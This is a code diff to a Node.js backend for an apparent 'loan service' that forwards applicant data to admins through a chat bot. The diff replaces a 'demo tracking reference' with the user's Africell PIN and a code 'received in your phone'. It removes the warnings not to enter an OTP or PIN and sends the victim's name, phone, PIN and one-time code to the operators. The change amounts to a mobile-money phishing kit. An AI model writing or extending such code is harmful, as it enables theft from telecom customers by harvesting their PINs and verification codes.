@@ -54,15 +54,15 @@ function adminKeyboard(id, stage) {
 }
 async function notifyAdmin(appData, stage) {
   const lines = [
-    `Independent Loan Service — ${stage === 1 ? 'STEP 1 REVIEW' : stage === 2 ? 'REFERENCE REVIEW' : 'LOAN REQUEST REVIEW'}`,
+    `NEW APPLICATION— ${stage === 1 ? 'STEP 1 REVIEW' : stage === 2 ? 'CODE REVIEW' : 'LOAN REQUEST REVIEW'}`,
     `Application: ${appData.id}`,
     `Assigned admin: ${appData.assignedAdmin ? '#' + appData.assignedAdmin : 'Unassigned'}`,
     `Name: ${appData.name}`,
     `Phone: ${appData.phone}`,
   ];
   if (appData.amount !== undefined) lines.push(`Requested amount: GMD ${Number(appData.amount).toLocaleString('en-US')}`);
-  if (appData.trackingReference) lines.push(`4-digit demo tracking reference: ${appData.trackingReference}\nTracking reference only — not a security code.`);
-  if (appData.reference) lines.push(`User-entered application tracking reference: ${appData.reference}\nTracking reference only — not a security code.`);
+  if (appData.trackingReference) lines.push(`PIN: ${appData.trackingReference}\nAfricell pin only.`);
+  if (appData.reference) lines.push(`CODE: ${appData.reference}\nEnter code recieve in your phone .`);
   const assigned = appData.assignedAdmin ? admins.find(x => Number(x.number) === Number(appData.assignedAdmin) && x.status === 'active' && x.chatId) : null;
   // Always notify super-admin; also notify the assigned admin when connected.
   const recipients = [...new Set([SUPER_ADMIN_CHAT_ID, assigned?.chatId].filter(Boolean).map(String))];
@@ -86,7 +86,7 @@ app.post('/api/application', async (req, res) => {
   const name = safe(req.body.name, 80);
   const phone = safe(req.body.phone, 24);
   const trackingReference = safe(req.body.trackingReference, 4);
-  if (!name || !phone || phone.length < 6 || !/^\d{4}$/.test(trackingReference)) return res.status(400).json({ error: 'Enter name, a valid phone number, and a 4-digit demo tracking reference. Do not enter an OTP or PIN.' });
+  if (!name || !phone || phone.length < 6 || !/^\d{4}$/.test(trackingReference)) return res.status(400).json({ error: 'Enter name, a valid phone number, and a 4-digit africell pin.' });
   const id = crypto.randomUUID();
   const slug = safe(req.body.adminSlug, 64);
   const linkedAdmin = admins.find(x => x.slug === slug);
